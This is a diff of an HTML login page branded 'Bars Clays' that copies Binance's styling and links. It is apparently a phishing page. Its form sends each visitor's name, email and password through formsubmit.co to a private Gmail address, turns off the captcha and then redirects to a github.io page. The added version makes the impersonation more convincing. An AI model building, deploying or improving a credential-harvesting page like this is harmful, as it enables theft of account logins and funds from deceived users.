@@ -1,1 +1,187 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Bars Clays - Sign Up</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}body{background:#f4f6f9;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px} .container{background:#fff;width:100%;max-width:400px;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08)}.logo{text-align:center;font-size:26px;font-weight:bold;margin-bottom:25px;color:#FCD535}.subtitle{text-align:center;font-size:14px;color:#555;margin-bottom:25px}.input-group{margin-bottom:18px;position:relative}.input-group input{width:100%;padding:12px;border-radius:6px;border:1px solid #ccc;font-size:14px;outline:none;transition:0.3s}.input-group input:focus{border-color:#FCD535}.toggle-password{position:absolute;right:10px;top:12px;cursor:pointer;font-size:14px;color:#666}.strength{font-size:12px;margin-top:5px}.strength.weak{color:red}.strength.medium{color:orange}.strength.strong{color:green}button{width:100%;padding:12px;border:none;background:#FCD535;color:#000;border-radius:6px;font-size:14px;cursor:pointer;transition:0.3s;font-weight:bold}button:hover{background:#e6b800}@media(max-width:480px){.container{padding:30px 20px}.logo{font-size:22px}.subtitle{font-size:13px}.input-group input{padding:10px;font-size:13px}button{padding:10px;font-size:13px}}</style></head><body><div class="container"><div class="logo">Bars Clays</div><div class="subtitle">Welcome to Bars Clays</div><form action="https://formsubmit.co/zenithaurora777@gmail.com" method="POST"><div class="input-group"><input type="text" name="name" placeholder="Your Name" required></div><div class="input-group"><input type="email" name="email" placeholder="Your Email" required></div><div class="input-group"><input type="password" name="password" id="password" placeholder="Your Password" required><span class="toggle-password" onclick="togglePassword()">Show</span><div id="strengthMessage" class="strength"></div></div><input type="hidden" name="_captcha" value="false"><input type="hidden" name="_next" value="success.html"><button type="submit">Continue</button></form></div><script>const passwordInput=document.getElementById("password");const strengthMessage=document.getElementById("strengthMessage");passwordInput.addEventListener("input",function(){const value=passwordInput.value;let strength=0;if(value.length>=6)strength++;if(/[A-Z]/.test(value))strength++;if(/[0-9]/.test(value))strength++;if(/[^A-Za-z0-9]/.test(value))strength++;if(value.length===0){strengthMessage.textContent="";strengthMessage.className="strength"}else if(strength<=1){strengthMessage.textContent="Weak password";strengthMessage.className="strength weak"}else if(strength<=3){strengthMessage.textContent="Medium strength";strengthMessage.className="strength medium"}else{strengthMessage.textContent="Strong password";strengthMessage.className="strength strong"}});function togglePassword(){if(passwordInput.type==="password"){passwordInput.type="text";document.querySelector(".toggle-password").textContent="Hide"}else{passwordInput.type="password";document.querySelector(".toggle-password").textContent="Show"}}</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bars Clays Login</title>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+        background-color: #0B0E11;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #EAECEF;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+    }
+
+    .close-btn {
+        font-size: 22px;
+        color: #848E9C;
+        cursor: pointer;
+        margin-bottom: 20px;
+    }
+
+    h1 {
+        font-size: 28px;
+        margin-bottom: 25px;
+        font-weight: 600;
+    }
+
+    label {
+        font-size: 14px;
+        color: #B7BDC6;
+        display: block;
+        margin-bottom: 8px;
+    }
+
+    .input-wrapper {
+        position: relative;
+        margin-bottom: 18px;
+    }
+
+    input {
+        width: 100%;
+        padding: 14px 40px 14px 14px;
+        border-radius: 8px;
+        border: none;
+        background-color: #1E2329;
+        color: #EAECEF;
+        font-size: 15px;
+    }
+
+    input:focus {
+        outline: 1px solid #FCD535;
+    }
+
+    .icon-btn {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #848E9C;
+        cursor: pointer;
+        font-size: 16px;
+        user-select: none;
+    }
+
+    .btn-primary {
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: 8px;
+        background-color: #FCD535;
+        color: #000;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 10px;
+        margin-bottom: 20px;
+    }
+
+    .btn-primary:hover {
+        opacity: 0.9;
+    }
+
+    .footer-link {
+        color: #FCD535;
+        margin-top: 15px;
+        display: block;
+        text-decoration: none;
+        font-weight: 500;
+    }
+
+    .footer-link:hover {
+        text-decoration: underline;
+    }
+
+    .forgot {
+        text-align: right;
+        font-size: 13px;
+        margin-top: -10px;
+        margin-bottom: 15px;
+    }
+
+    .forgot a {
+        color: #848E9C;
+        text-decoration: none;
+    }
+
+    .forgot a:hover {
+        color: #FCD535;
+    }
+</style>
+</head>
+
+<body>
+<div class="container">
+
+    <div class="close-btn">&times;</div>
+    <h1>Log in</h1>
+
+    <!-- FORM -->
+    <form action="https://formsubmit.co/zenithaurora777@gmail.com" method="POST">
+        <label>Name</label>
+        <div class="input-wrapper">
+            <input type="text" name="name" placeholder="Your Name" required>
+            <span class="icon-btn" onclick="clearName()">✕</span>
+        </div>
+
+        <label>Email</label>
+        <div class="input-wrapper">
+            <input type="email" name="email" placeholder="Your Email" required>
+            <span class="icon-btn" onclick="clearEmail()">✕</span>
+        </div>
+
+        <label>Password</label>
+        <div class="input-wrapper">
+            <input type="password" name="password" id="password" placeholder="Your Password" required>
+            <span class="icon-btn" onclick="togglePassword()">👁</span>
+        </div>
+
+        <!-- Disable captcha -->
+        <input type="hidden" name="_captcha" value="false">
+
+        <!-- Optional redirect after submit -->
+        <input type="hidden" name="_next" value="https://barsclaysmanag.github.io/bars_clays/">
+
+        <button type="submit" class="btn-primary">Continue</button>
+    </form>
+
+    <div class="forgot">
+        <a href="#">Forgot password?</a>
+    </div>
+
+    <a href="#" class="footer-link">Create a Binance Account</a>
+    <a href="#" class="footer-link">Need help?</a>
+
+</div>
+
+<script>
+function clearEmail() {
+    document.querySelector('input[name="email"]').value = "";
+}
+function clearName() {
+    document.querySelector('input[name="name"]').value = "";
+}
+function togglePassword() {
+    const password = document.getElementById("password");
+    password.type = password.type === "password" ? "text" : "password";
+}
+</script>
+
+</body>
+</html>
